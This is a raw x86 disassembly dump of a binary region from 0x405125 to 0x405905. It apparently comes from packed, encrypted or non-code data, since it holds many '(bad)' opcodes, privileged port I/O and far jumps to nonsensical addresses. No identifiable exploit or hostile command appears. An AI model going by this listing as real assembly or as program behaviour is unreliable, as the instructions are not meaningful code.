  405125:	sbb    al,0xea
  405127:	sub    BYTE PTR [ebx-0x1f577e6a],ch
  40512d:	inc    ecx
  40512e:	jns    0x4050b6
  405130:	sbb    eax,0xc4ba00af
  405135:	cld    
  405136:	fdiv   QWORD PTR [ebx]
  405138:	es ds or al,0x38
  40513c:	xchg   esi,eax
  40513d:	pop    esp
  40513e:	outs   dx,DWORD PTR ds:[esi]
  40513f:	push   0x33
  405141:	sbb    ecx,esi
  405143:	xchg   DWORD PTR [ebx+0xe5aeea5],eax
  405149:	cwde   
  40514a:	xor    eax,0xf636a855
  40514f:	stos   BYTE PTR es:[edi],al
  405150:	shr    BYTE PTR [eax-0xa1f193],1
  405156:	data16 jle 0x40510f
  405159:	test   BYTE PTR [edx+0x2bf84979],ah
  40515f:	pop    es
  405160:	xchg   edi,eax
  405161:	or     edi,ecx
  405163:	mov    WORD PTR [eax+ebp*2+0x0],cs
  405167:	sbb    al,0x47
  405169:	enter  0x92ab,0xf5
  40516d:	cmc    
  40516e:	test   DWORD PTR [ebp-0xa],ecx
  405171:	adc    al,0xeb
  405173:	stc    
  405174:	js     0x405125
  405176:	adc    al,0xe6
  405178:	mov    DWORD PTR [ebx-0x4c],eax
  40517b:	mov    esp,0xc4c1be21
  405180:	stos   DWORD PTR es:[edi],eax
  405181:	or     esp,esp
  405183:	in     al,0x7b
  405185:	adc    al,0x45
  405187:	ins    DWORD PTR es:[edi],dx
  405188:	push   edx
  405189:	sti    
  40518a:	mov    ebp,0xbfe5a6e
  40518f:	cmp    bl,BYTE PTR [eax+0x49182ef0]
  405195:	and    DWORD PTR [edi],eax
  405197:	pop    ds
  405198:	xchg   esi,eax
  405199:	fld    TBYTE PTR [ebx+edx*2+0x29]
  40519d:	mov    esp,0x3326e273
  4051a2:	xchg   ecx,eax
  4051a3:	call   0xaecf:0xb4a2b5af
  4051aa:	add    dl,BYTE PTR [edx+0x3e145d7e]
  4051b0:	stos   DWORD PTR es:[edi],eax
  4051b1:	loop   0x40522d
  4051b3:	dec    esi
  4051b4:	out    0xab,eax
  4051b6:	mov    WORD PTR [edi+0xc],?
  4051b9:	enter  0x82f9,0x17
  4051bd:	push   cs
  4051be:	shr    BYTE PTR [eax+0x6e2dd9c0],cl
  4051c4:	inc    ecx
  4051c5:	mov    ah,dl
  4051c7:	out    dx,eax
  4051c8:	mov    ds:0xf6320bb6,al
  4051cd:	jl     0x40515f
  4051cf:	or     eax,0x79f00027
  4051d4:	out    dx,al
  4051d5:	and    BYTE PTR [ecx-0x14],dh
  4051d8:	xor    BYTE PTR [esp+edx*2-0x65f6c1ed],dl
  4051df:	dec    esp
  4051e0:	cli    
  4051e1:	xchg   esi,eax
  4051e2:	into   
  4051e3:	cli    
  4051e4:	jge    0x4051a9
  4051e6:	test   eax,0x2d24f669
  4051eb:	out    dx,eax
  4051ec:	pop    ebp
  4051ed:	xor    eax,0x30b945ad
  4051f2:	retf   0xaa0
  4051f5:	pop    ss
  4051f6:	jbe    0x4051ee
  4051f8:	adc    ecx,DWORD PTR [esi-0x357de32d]
  4051fe:	into   
  4051ff:	fucom  st(7)
  405201:	jae    0x40519d
  405203:	dec    edx
  405204:	test   ch,bl
  405206:	and    esi,DWORD PTR [esi]
  405208:	mov    ch,0xa0
  40520a:	aad    0x1f
  40520c:	inc    ebp
  40520d:	inc    esi
  40520e:	stos   BYTE PTR es:[edi],al
  40520f:	and    eax,edx
  405211:	ror    BYTE PTR [edi],0x4b
  405214:	scas   eax,DWORD PTR es:[edi]
  405215:	loopne 0x40523b
  405217:	push   ecx
  405218:	jo     0x4051a6
  40521a:	sub    edi,DWORD PTR [ebp-0x13853c3b]
  405220:	pop    ss
  405221:	jmp    0x9e91161
  405226:	call   0x3323:0xa492fae4
  40522d:	jmp    0xda08:0xb334ec1b
  405234:	imul   eax,esi,0x16
  405237:	(bad)  
  405238:	pop    ss
  405239:	imul   ecx,edx,0x12dea23b
  40523f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405240:	and    ecx,DWORD PTR [esi+esi*4+0x12]
  405244:	sbb    DWORD PTR [edx-0x2ccbb747],ebp
  40524a:	sti    
  40524b:	sbb    DWORD PTR [esi+0x23],edi
  40524e:	inc    ebx
  40524f:	adc    dl,BYTE PTR [ecx+ebx*4-0x6d]
  405253:	jl     0x40520a
  405255:	or     ecx,DWORD PTR [eax]
  405257:	bound  edi,QWORD PTR [ebp-0x1358ca06]
  40525d:	push   eax
  40525e:	pop    es
  40525f:	pop    ecx
  405260:	sbb    al,0x99
  405262:	dec    edi
  405263:	outs   dx,DWORD PTR ds:[esi]
  405264:	popf   
  405265:	adc    BYTE PTR [ebp+0x54],ch
  405268:	lea    ebx,ds:0xea58a3c7
  40526e:	ds dec ebx
  405270:	fst    st(6)
  405272:	cmp    eax,0x49df9c7
  405277:	jae    0x4052af
  405279:	leave  
  40527a:	jae    0x405266
  40527c:	pop    ebp
  40527d:	call   DWORD PTR [edi+0x274bcdc]
  405283:	mov    esi,DWORD PTR [ecx]
  405285:	cmp    BYTE PTR [ebx],0x7f
  405288:	aaa    
  405289:	pop    esi
  40528a:	popa   
  40528b:	bound  ebp,QWORD PTR [edi-0x31769042]
  405291:	mov    esi,0x3ab03dc
  405296:	out    0x3b,al
  405298:	stos   DWORD PTR es:[edi],eax
  405299:	jnp    0x4052d7
  40529b:	data16 aad 0xa6
  40529e:	shr    ecx,cl
  4052a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052a1:	xchg   esi,eax
  4052a2:	fwait
  4052a3:	sti    
  4052a4:	jne    0x405285
  4052a6:	mov    eax,ecx
  4052a8:	mov    gs,ecx
  4052aa:	rcr    DWORD PTR [edx],cl
  4052ac:	mov    eax,0x33f0994a
  4052b1:	push   ss
  4052b2:	mov    ah,BYTE PTR [esi+0x189e6316]
  4052b8:	jne    0x405290
  4052ba:	inc    ecx
  4052bb:	mov    bh,0xa3
  4052bd:	push   0xffffff8b
  4052bf:	xchg   DWORD PTR [edi+0x6e7c1057],ecx
  4052c5:	cs jmp 0x405346
  4052c8:	pop    ebp
  4052c9:	cld    
  4052ca:	aad    0x82
  4052cc:	mov    bh,0x93
  4052ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052cf:	popa   
  4052d0:	inc    edx
  4052d1:	sbb    DWORD PTR [edi+0x4cf9eeb4],ecx
  4052d7:	adc    eax,0x6383eb61
  4052dc:	add    al,0x60
  4052de:	sar    dh,1
  4052e0:	jmp    0x41529dcb
  4052e5:	jl     0x405298
  4052e7:	fdiv   QWORD PTR [edi+0x6d94ab2f]
  4052ed:	sub    eax,0x4907bba2
  4052f2:	sub    ebp,DWORD PTR [ebp+0x4]
  4052f5:	push   es
  4052f6:	sbb    eax,0xa12a6279
  4052fb:	jle    0x405282
  4052fd:	xor    DWORD PTR [eax],esi
  4052ff:	sar    DWORD PTR [edi+0x6f270a5c],cl
  405305:	push   es
  405306:	(bad)  
  405308:	push   ds
  405309:	outs   dx,DWORD PTR ds:[esi]
  40530a:	inc    edi
  40530b:	(bad)  
  40530c:	or     eax,0x8d2ee109
  405311:	mov    ds:0xa4d832ff,eax
  405316:	ror    DWORD PTR [esi+ebx*8-0x65ccaf97],1
  40531d:	outs   dx,DWORD PTR ds:[esi]
  40531e:	sbb    eax,0xfb335a9a
  405323:	test   eax,0xb8479036
  405328:	sub    eax,DWORD PTR [edx-0x37dba55b]
  40532e:	push   ds
  40532f:	das    
  405330:	jecxz  0x4052e1
  405332:	mov    esp,0x217a3646
  405337:	sbb    eax,0xd7bd743a
  40533c:	cli    
  40533d:	mov    bl,0xdc
  40533f:	mov    dl,0xd5
  405341:	test   eax,0x92ca01df
  405346:	or     ch,BYTE PTR [esi-0x4b]
  405349:	add    DWORD PTR [ecx+0x7a26a5bb],esi
  40534f:	and    al,BYTE PTR [edi+ebp*4-0x6]
  405353:	jno    0x405301
  405355:	add    edi,esp
  405357:	and    bh,bl
  405359:	out    dx,al
  40535a:	js     0x405309
  40535c:	jae    0x405347
  40535e:	test   eax,0x964b6958
  405363:	call   0x344:0xe37fa1be
  40536a:	leave  
  40536b:	mov    esi,0x795f569c
  405370:	and    BYTE PTR [ecx],0xf1
  405373:	adc    al,0x2b
  405375:	adc    al,al
  405377:	out    dx,eax
  405378:	push   esp
  405379:	inc    ecx
  40537a:	inc    esi
  40537b:	clc    
  40537c:	or     eax,0xc70c8c82
  405381:	scas   al,BYTE PTR es:[edi]
  405382:	add    BYTE PTR [eax],cl
  405384:	int    0x1a
  405386:	add    DWORD PTR [ebx+0xd1b7113],edi
  40538c:	inc    esi
  40538d:	jb     0x40534f
  40538f:	pop    esp
  405390:	jno    0x40532f
  405392:	fsubr  DWORD PTR [esi]
  405394:	inc    ebx
  405395:	loop   0x405369
  405397:	cmp    bh,0xc6
  40539a:	js     0x40539d
  40539c:	push   ebx
  40539d:	(bad)  
  40539e:	mov    al,ds:0x9845f765
  4053a3:	fwait
  4053a4:	pop    ds
  4053a5:	mov    DWORD PTR [edx+0x118abd46],ecx
  4053ab:	shl    DWORD PTR [edx-0x7a],1
  4053ae:	ror    DWORD PTR [ecx+0xb],1
  4053b1:	push   ds
  4053b2:	pop    ds
  4053b3:	add    bl,BYTE PTR [ecx-0x5e]
  4053b6:	xlat   BYTE PTR ds:[ebx]
  4053b7:	stos   DWORD PTR es:[edi],eax
  4053b8:	aam    0x6e
  4053ba:	xchg   DWORD PTR [esi],edx
  4053bc:	xor    eax,0x23df8034
  4053c1:	dec    edx
  4053c2:	push   esi
  4053c3:	xchg   edx,eax
  4053c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c5:	inc    ebp
  4053c6:	sub    cl,0x91
  4053c9:	fist   DWORD PTR ds:0x7e0abe7d
  4053cf:	pop    ds
  4053d0:	aad    0x18
  4053d2:	cmp    al,0xc5
  4053d4:	xor    bl,cl
  4053d6:	cmp    ebp,DWORD PTR [edx]
  4053d8:	cmc    
  4053d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053da:	add    dh,bl
  4053dc:	or     al,0x57
  4053de:	xor    edx,DWORD PTR [esi-0x52]
  4053e1:	jmp    0x88c16595
  4053e6:	outs   dx,BYTE PTR ds:[esi]
  4053e7:	fcmovnu st,st(3)
  4053e9:	jne    0x40537f
  4053eb:	mov    ds:0xc546ec95,eax
  4053f0:	ins    BYTE PTR es:[edi],dx
  4053f1:	or     DWORD PTR [edi+0x34],0xffffffe2
  4053f5:	sbb    eax,0x25d7d5d1
  4053fa:	and    DWORD PTR [ebp+ebx*1+0x155a52dd],ebx
  405401:	addr16 fwait
  405403:	mul    BYTE PTR [esi]
  405405:	push   ebp
  405406:	dec    esi
  405407:	or     al,BYTE PTR [eax-0x45]
  40540a:	push   0x36
  40540c:	xor    ah,dl
  40540e:	adc    eax,0xcc19e0de
  405413:	mov    dl,0x94
  405415:	mov    eax,0x2ca6ecbf
  40541a:	addr16 ret 0xfcfa
  40541e:	dec    edi
  40541f:	or     ebx,DWORD PTR [eax+0x17]
  405422:	lods   eax,DWORD PTR ds:[esi]
  405423:	(bad)  
  405424:	nop
  405425:	into   
  405426:	adc    eax,DWORD PTR [eax]
  405428:	adc    DWORD PTR [ebx+eax*8-0x32],edx
  40542c:	mov    ebp,0xea5e4f80
  405431:	fnstcw WORD PTR [edi]
  405433:	fisttp DWORD PTR fs:[eax-0xa]
  405437:	int3   
  405438:	push   edi
  405439:	aad    0xa8
  40543b:	les    esp,FWORD PTR [edi]
  40543d:	ja     0x405487
  40543f:	mov    al,0xcf
  405441:	mov    ebp,0x86361bad
  405446:	mov    al,0xd1
  405448:	aad    0x38
  40544a:	mov    eax,ds:0xc366f680
  40544f:	daa    
  405450:	xor    BYTE PTR [eax],0x3b
  405453:	call   0x1e8e64f1
  405458:	sub    ch,dh
  40545a:	sbb    esi,DWORD PTR [esi-0x72]
  40545d:	sbb    BYTE PTR [ecx],dl
  40545f:	cdq    
  405460:	ja     0x405411
  405462:	push   ebx
  405463:	pop    esi
  405464:	mov    ebx,0x192d7ed
  405469:	xor    bl,al
  40546b:	xchg   edx,eax
  40546c:	data16 adc BYTE PTR [esi],dh
  40546f:	cwde   
  405470:	and    ebx,0xffffff99
  405473:	push   cs
  405474:	cmp    BYTE PTR [ebx-0x1a315f29],ah
  40547a:	mov    DWORD PTR [ebx+ebx*2+0x6c18e63a],eax
  405481:	mov    ah,0x12
  405483:	cmp    al,0x57
  405485:	(bad)  
  405486:	xchg   esp,eax
  405487:	hlt    
  405488:	mov    ecx,0x37ed617d
  40548d:	sbb    eax,DWORD PTR [ebx+0xd]
  405490:	test   DWORD PTR [ebx-0xb164906],0x5d8d2a0a
  40549a:	push   ebp
  40549b:	sub    ah,dl
  40549d:	and    DWORD PTR [ecx+0x47225a58],ebp
  4054a3:	or     BYTE PTR [edi],al
  4054a5:	xchg   ah,cl
  4054a7:	mov    ecx,0xc306356c
  4054ac:	mov    ss,WORD PTR [esi-0x77ba64ae]
  4054b2:	push   ss
  4054b3:	sub    edi,edx
  4054b5:	jmp    DWORD PTR [ecx]
  4054b7:	aad    0x4b
  4054b9:	push   esi
  4054ba:	xor    al,0x3a
  4054bc:	dec    esi
  4054bd:	icebp  
  4054be:	xor    BYTE PTR [ecx-0x6],ch
  4054c1:	retf   
  4054c2:	jnp    0x40550b
  4054c4:	adc    eax,0x978036af
  4054c9:	fist   WORD PTR [edi+0x6008a03a]
  4054cf:	sub    al,0x3f
  4054d1:	ds push edi
  4054d3:	(bad)  
  4054d5:	fs pop eax
  4054d7:	sub    ch,BYTE PTR es:[ecx-0x7d]
  4054db:	cmp    BYTE PTR [ebx],cl
  4054dd:	int3   
  4054de:	or     eax,0x9a0c543b
  4054e3:	ja     0x40552f
  4054e5:	lods   eax,DWORD PTR ds:[esi]
  4054e6:	and    ecx,DWORD PTR [esi]
  4054e8:	inc    esp
  4054e9:	iret   
  4054ea:	ds stos BYTE PTR es:[edi],al
  4054ec:	in     eax,0xed
  4054ee:	jmp    0x17d67a9a
  4054f3:	xchg   BYTE PTR [ebx-0x205c7e0c],bl
  4054f9:	jl     0x405509
  4054fb:	mov    esp,es
  4054fd:	std    
  4054fe:	jmp    0x6861b458
  405503:	addr16 in al,0xa8
  405506:	adc    eax,DWORD PTR [ebx+0x429d5a8]
  40550c:	imul   ebp,DWORD PTR ds:0xc07966fa,0x11
  405513:	xor    eax,0x7659976f
  405518:	mov    ebx,DWORD PTR [edx-0xe75269e]
  40551e:	in     al,dx
  40551f:	lods   eax,DWORD PTR ds:[esi]
  405520:	mov    eax,0x124c5c63
  405525:	fst    QWORD PTR [eax]
  405527:	repnz cld 
  405529:	xchg   ebp,eax
  40552a:	inc    DWORD PTR [edi]
  40552c:	xchg   ebp,eax
  40552d:	iret   
  40552e:	out    0x5e,eax
  405530:	adc    DWORD PTR [ecx],0x72df13c3
  405536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405537:	add    DWORD PTR [esi+0x7e5e1138],eax
  40553d:	sub    ebx,eax
  40553f:	repz sbb ah,BYTE PTR [eax]
  405542:	sahf   
  405543:	push   ds
  405544:	out    0x8f,eax
  405546:	mov    eax,0x159b9de
  40554b:	mov    cl,dh
  40554d:	dec    ebp
  40554e:	shl    BYTE PTR [edi-0x20f066bf],1
  405554:	mov    ds:0x8065ef02,eax
  405559:	mov    ah,0x65
  40555b:	inc    ecx
  40555c:	jmp    0x405520
  40555e:	hlt    
  40555f:	xor    eax,0x3122cadd
  405564:	xchg   edi,eax
  405565:	push   ss
  405566:	out    0xae,al
  405568:	mov    DWORD PTR ds:0x759b9120,edi
  40556e:	or     al,0x20
  405570:	pop    ebp
  405571:	clc    
  405572:	cdq    
  405573:	cmp    cl,ch
  405575:	mov    ds:0x9d24925d,eax
  40557a:	ret    0xee48
  40557d:	fs jns 0x40559c
  405580:	add    ebx,ecx
  405582:	lods   al,BYTE PTR ds:[esi]
  405583:	test   eax,0xf74be0c4
  405588:	(bad)  
  405589:	pop    ecx
  40558a:	(bad)  
  40558b:	cld    
  40558c:	push   es
  40558d:	ret    
  40558e:	sbb    BYTE PTR ds:0xcc28a63f,al
  405594:	lea    esi,[edx+0x69c80dc5]
  40559a:	ror    DWORD PTR [ebx],1
  40559c:	or     al,0x3
  40559e:	mul    BYTE PTR [ecx+0x5f72d428]
  4055a4:	test   BYTE PTR [esi+0x29],cl
  4055a7:	jecxz  0x405596
  4055a9:	push   ebx
  4055aa:	bound  ecx,QWORD PTR [ebx+0x37]
  4055ad:	enter  0x369b,0xb0
  4055b1:	lock fild WORD PTR [esi+0x4a1efd3a]
  4055b8:	sbb    ebp,DWORD PTR [esi-0x228b642d]
  4055be:	icebp  
  4055bf:	(bad)  
  4055c0:	mov    al,ds:0x93bc7724
  4055c5:	ja     0x4055f0
  4055c7:	imul   al
  4055c9:	addr16 push edx
  4055cb:	push   edi
  4055cc:	setp   ch
  4055cf:	lds    ebp,FWORD PTR [ecx+0x4d]
  4055d2:	mov    ah,BYTE PTR [ecx-0x20]
  4055d5:	sub    esp,DWORD PTR [edi+0x7c12aee7]
  4055db:	aad    0x20
  4055dd:	xchg   ecx,eax
  4055de:	lods   al,BYTE PTR ds:[esi]
  4055df:	icebp  
  4055e0:	cld    
  4055e1:	sub    BYTE PTR ds:0xcd43bacb,ch
  4055e7:	inc    esi
  4055e8:	ss test ah,0x86
  4055ec:	jl     0x405642
  4055ee:	(bad)  
  4055f0:	xor    BYTE PTR [ebx+ecx*8],dh
  4055f3:	cmp    al,0xd7
  4055f5:	mov    esp,0x5a134986
  4055fa:	xchg   ecx,eax
  4055fb:	xchg   ebp,eax
  4055fc:	cld    
  4055fd:	outs   dx,BYTE PTR ds:[esi]
  4055fe:	sbb    eax,0xfddd2bd1
  405603:	(bad)  
  405604:	mov    edi,0xb08973df
  405609:	jmp    0x85bc:0x4cec987c
  405610:	add    eax,0x3855f260
  405615:	ss hlt 
  405617:	sbb    BYTE PTR [esi+ecx*1-0x572c9b58],ch
  40561e:	sbb    al,0xde
  405620:	push   ss
  405621:	push   ss
  405622:	jl     0x40565d
  405624:	inc    ebx
  405625:	(bad)  
  405626:	sbb    al,ah
  405628:	cwde   
  405629:	sub    esp,ebp
  40562b:	or     eax,0xe46d09c
  405630:	adc    al,0x65
  405632:	stos   BYTE PTR es:[edi],al
  405633:	inc    edi
  405634:	in     eax,0x8c
  405636:	popa   
  405637:	scas   eax,DWORD PTR es:[edi]
  405638:	sbb    al,BYTE PTR [ecx+0x36efc1bd]
  40563e:	pop    ds
  40563f:	iret   
  405640:	pusha  
  405641:	adc    ebx,esi
  405643:	clc    
  405644:	or     DWORD PTR [esi+edx*2+0x5d],0xfb64da9d
  40564c:	fimul  WORD PTR [eax]
  40564e:	xor    eax,0x4bbd988c
  405653:	push   esi
  405654:	push   ebx
  405655:	aad    0x36
  405657:	or     eax,0xedc055b2
  40565c:	inc    esp
  40565d:	push   esi
  40565e:	lds    esi,FWORD PTR [esi-0xc]
  405661:	add    DWORD PTR ds:0x528dc6ae,esi
  405667:	inc    edi
  405668:	push   0x6118f8fd
  40566d:	sub    eax,0xd4fc0686
  405672:	cmc    
  405673:	fmul   st(0),st
  405675:	mov    bl,0x74
  405677:	jp     0x4056a8
  405679:	mov    esp,DWORD PTR [edi]
  40567b:	test   ecx,edx
  40567d:	call   0xf8ca:0x98374d9a
  405684:	xchg   ebx,eax
  405685:	dec    ebx
  405686:	dec    esp
  405687:	jns    0x40561c
  405689:	in     eax,dx
  40568a:	xchg   ebp,eax
  40568b:	test   ah,bh
  40568d:	xchg   esi,eax
  40568e:	jae    0x40565c
  405690:	pop    es
  405691:	cmp    bl,bl
  405693:	pusha  
  405694:	fldcw  WORD PTR [edx]
  405696:	cmp    esp,esi
  405698:	dec    ebx
  405699:	mov    ebx,0x8db3754a
  40569e:	out    dx,al
  40569f:	cmp    BYTE PTR [ecx],dl
  4056a1:	adc    al,0x42
  4056a3:	int    0xcc
  4056a5:	pop    ecx
  4056a6:	outs   dx,DWORD PTR ds:[esi]
  4056a7:	mov    cl,0x91
  4056a9:	jo     0x4056f7
  4056ab:	mov    al,dl
  4056ad:	xchg   DWORD PTR [esi-0x15],edi
  4056b0:	xchg   esi,eax
  4056b1:	sbb    BYTE PTR [ebx+0x4c],0x2
  4056b5:	nop
  4056b6:	pop    edx
  4056b7:	mov    ebx,0x548ac865
  4056bc:	(bad)  
  4056bd:	jmp    0x40572c
  4056bf:	(bad)  
  4056c0:	pusha  
  4056c1:	addr16 and al,0xcc
  4056c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c5:	mov    bl,0x35
  4056c7:	cmc    
  4056c8:	xchg   esi,eax
  4056c9:	sub    DWORD PTR [ecx-0x18409edd],0xffffffe0
  4056d0:	fidiv  DWORD PTR [edi-0x2c0e4a27]
  4056d6:	ins    BYTE PTR es:[edi],dx
  4056d7:	or     eax,DWORD PTR [edx+0x65]
  4056da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056db:	out    dx,al
  4056dc:	(bad)  
  4056dd:	aam    0xc3
  4056df:	dec    ebx
  4056e0:	xchg   edx,eax
  4056e1:	xor    BYTE PTR [ebp+0x1f6ecca7],dl
  4056e7:	outs   dx,BYTE PTR ds:[esi]
  4056e8:	fisubr DWORD PTR [esi]
  4056ea:	adc    eax,0xad1a6214
  4056ef:	adc    edx,DWORD PTR [ecx+0x42ba7963]
  4056f5:	sub    dh,BYTE PTR [ebx-0x1854b35f]
  4056fb:	push   edx
  4056fc:	pop    ebx
  4056fd:	fild   QWORD PTR [edi-0x43]
  405700:	into   
  405701:	mov    al,ds:0x3bf0b9a
  405706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405707:	inc    eax
  405708:	jns    0x4056df
  40570a:	ins    DWORD PTR es:[edi],dx
  40570b:	(bad)  
  40570e:	and    ecx,esp
  405710:	test   BYTE PTR [ebx],ch
  405712:	inc    eax
  405713:	in     eax,dx
  405714:	out    dx,al
  405715:	loop   0x4056e4
  405717:	shl    dh,1
  405719:	xor    cl,BYTE PTR [esi]
  40571b:	jbe    0x4056fc
  40571d:	retf   
  40571e:	cmp    eax,0x2d0cde31
  405723:	sahf   
  405724:	mov    ds:0x9d70e239,eax
  405729:	(bad)  
  40572a:	jmp    0x40577c
  40572c:	xor    DWORD PTR [edx-0x45],edx
  40572f:	es in  al,0x62
  405732:	sub    BYTE PTR [edi-0x7a],al
  405735:	sub    dh,BYTE PTR [ebp-0x5b8f838b]
  40573b:	xchg   esi,eax
  40573c:	shr    BYTE PTR [ecx],1
  40573e:	xchg   edi,eax
  40573f:	add    edi,edx
  405741:	sbb    eax,0xf96d05f5
  405746:	das    
  405747:	(bad)  
  405748:	pinsrw mm4,WORD PTR [edi],0x92
  40574c:	xchg   edx,eax
  40574d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40574e:	adc    eax,0x5a5f022b
  405753:	mov    bh,0x41
  405755:	push   ss
  405756:	pop    esp
  405757:	push   cs
  405758:	dec    eax
  405759:	mov    ch,0x9b
  40575b:	ss mov bh,0x87
  40575e:	mov    ds:0xf7cd4177,eax
  405763:	xchg   ah,ah
  405765:	popf   
  405766:	outs   dx,BYTE PTR ds:[esi]
  405767:	cs jbe 0x405783
  40576a:	jg     0x405723
  40576c:	fisubr WORD PTR [edx+ebx*1]
  40576f:	mov    dh,0xb3
  405771:	rcl    DWORD PTR [eax-0x64],0x1c
  405775:	int3   
  405776:	shl    DWORD PTR [edi-0x4f6cb9b],cl
  40577c:	and    DWORD PTR [ebx-0x3a],edx
  40577f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405780:	rcl    DWORD PTR [ecx],cl
  405782:	dec    edx
  405783:	jno    0x4057f3
  405785:	les    edx,FWORD PTR [esi]
  405787:	push   ss
  405788:	fisub  WORD PTR [eax]
  40578a:	dec    edx
  40578b:	and    al,0x77
  40578d:	aaa    
  40578e:	sbb    eax,0xc8dc8f69
  405793:	loopne 0x4057ae
  405795:	xchg   ecx,eax
  405796:	or     dl,BYTE PTR [esi-0x1d]
  405799:	dec    ecx
  40579a:	jmp    0x405757
  40579c:	mov    DWORD PTR [ebx-0x6641c312],ebp
  4057a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a3:	or     BYTE PTR [edx-0x32e9baa9],cl
  4057a9:	sbb    eax,0xb4b10116
  4057ae:	mov    ah,0xe8
  4057b0:	fmul   QWORD PTR [ebp+ebx*1+0x38]
  4057b4:	cmp    BYTE PTR [ecx-0x16cdbc86],ah
  4057ba:	dec    ebp
  4057bb:	sbb    ebx,DWORD PTR [edi+0x6dc22ebc]
  4057c1:	mov    bh,0x21
  4057c3:	jns    0x4057b9
  4057c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c6:	xor    al,0x71
  4057c8:	lock dec ebx
  4057cb:	sub    BYTE PTR [ebx],dh
  4057cd:	sbb    eax,0x50b6095e
  4057d2:	ss retf 0x53a6
  4057d6:	std    
  4057d7:	stos   DWORD PTR es:[edi],eax
  4057d8:	jg     0x405840
  4057da:	fbstp  TBYTE PTR [ebx+0x3b1b77fb]
  4057e0:	dec    edi
  4057e1:	ins    DWORD PTR es:[edi],dx
  4057e2:	idiv   BYTE PTR [ebx-0x20]
  4057e5:	cmp    ah,bh
  4057e7:	jae    0x405846
  4057e9:	sub    BYTE PTR [ecx+0x68d975b8],0x7c
  4057f0:	call   0x97c50a1
  4057f5:	xor    al,0x85
  4057f7:	sti    
  4057f8:	cmp    DWORD PTR [edi+0x6f],ebp
  4057fb:	lahf   
  4057fc:	sub    BYTE PTR ds:0x82500067,0xd
  405803:	mov    ch,0x41
  405805:	div    BYTE PTR [edi+0x24b003d1]
  40580b:	rol    esp,1
  40580d:	cmp    dl,BYTE PTR [edx+0x77]
  405810:	mov    ?,WORD PTR [ebp-0x116da281]
  405816:	inc    edx
  405817:	iret   
  405818:	ja     0x405873
  40581a:	dec    ecx
  40581b:	neg    DWORD PTR [ebx-0x13]
  40581e:	mov    cl,0x2b
  405820:	mov    ecx,0xf4306cf1
  405825:	daa    
  405826:	jno    0x4057d9
  405828:	xor    edi,DWORD PTR [edi+0xddc4ef5]
  40582e:	add    dl,dh
  405830:	cmp    al,0xfa
  405832:	out    dx,al
  405833:	test   al,0xb1
  405835:	nop
  405836:	mov    dl,BYTE PTR [ecx+0x4129c205]
  40583c:	aas    
  40583d:	retf   
  40583e:	sbb    bl,BYTE PTR [eax+eiz*2]
  405841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405842:	stc    
  405843:	ds pop esp
  405845:	push   DWORD PTR [edx+ecx*4-0x20]
  405849:	mov    DWORD PTR [edx],0x1ae39be3
  40584f:	pusha  
  405850:	sbb    al,0x55
  405852:	and    ecx,edi
  405854:	dec    ecx
  405855:	mov    ebx,edi
  405857:	pop    esp
  405858:	pop    edi
  405859:	scas   al,BYTE PTR es:[edi]
  40585a:	aad    0x94
  40585c:	adc    al,0x1f
  40585e:	aaa    
  40585f:	loopne 0x4058d8
  405861:	pop    ebp
  405862:	xchg   ecx,eax
  405863:	(bad)  
  405864:	mov    ebp,0x3863a1b3
  405869:	rol    DWORD PTR [ecx-0x22036a60],1
  40586f:	das    
  405870:	outs   dx,BYTE PTR ds:[esi]
  405871:	ss cmp al,0x2e
  405874:	nop
  405875:	sub    al,0x75
  405877:	ja     0x40584b
  405879:	loopne 0x405862
  40587b:	dec    ecx
  40587c:	in     al,0xb0
  40587e:	xchg   esi,eax
  40587f:	sub    al,0x5c
  405881:	xchg   ecx,eax
  405882:	mov    dh,0xa1
  405884:	or     DWORD PTR [ecx],0xffffffcd
  405887:	iret   
  405888:	and    DWORD PTR [edi*8-0x7f50eae5],ecx
  40588f:	ds pop esi
  405891:	sbb    ecx,DWORD PTR [esp+ebx*1-0x16]
  405895:	jno    0x405833
  405897:	iret   
  405898:	adc    bh,BYTE PTR [ecx+esi*8]
  40589b:	dec    ebx
  40589c:	ret    
  40589d:	test   DWORD PTR [esi+0x38],esi
  4058a0:	mov    cl,0xc3
  4058a2:	mov    BYTE PTR [edi+0x8],dl
  4058a5:	xchg   edi,eax
  4058a6:	ret    
  4058a7:	das    
  4058a8:	popa   
  4058a9:	and    bl,BYTE PTR [esi-0x24]
  4058ac:	inc    ebx
  4058ad:	mov    ds:0x3c44f309,eax
  4058b2:	sub    ah,BYTE PTR [ebp-0x40]
  4058b5:	or     eax,0xeb9619bd
  4058ba:	(bad)  
  4058bc:	fmulp  st(1),st
  4058be:	cmp    bl,BYTE PTR [edx+0xf1ebf80]
  4058c4:	lock arpl WORD PTR [esi-0x19],si
  4058c8:	jg     0x40589a
  4058ca:	lea    ebp,[eax-0x6f503dac]
  4058d0:	jge    0x40586d
  4058d2:	inc    esp
  4058d3:	inc    ecx
  4058d4:	sbb    dh,BYTE PTR [edx+ebp*8+0x2b5823f0]
  4058db:	scas   al,BYTE PTR es:[edi]
  4058dc:	clc    
  4058dd:	mov    DWORD PTR [edx+0x69],eax
  4058e0:	sub    dl,BYTE PTR [edx]
  4058e2:	push   esi
  4058e3:	ror    al,cl
  4058e5:	or     al,al
  4058e7:	inc    esi
  4058e8:	(bad)
  4058eb:	aam    0x69
  4058ed:	jnp    0x405909
  4058ef:	adc    al,0x6
  4058f1:	pop    ecx
  4058f2:	stos   DWORD PTR es:[edi],eax
  4058f3:	in     eax,dx
  4058f4:	sub    eax,0x39fc205a
  4058f9:	leave  
  4058fa:	adc    eax,0x28ed211d
  4058ff:	gs mov esi,0xcad1d1fa
  405905:	and    BYTE PTR [ecx-0x75],bh
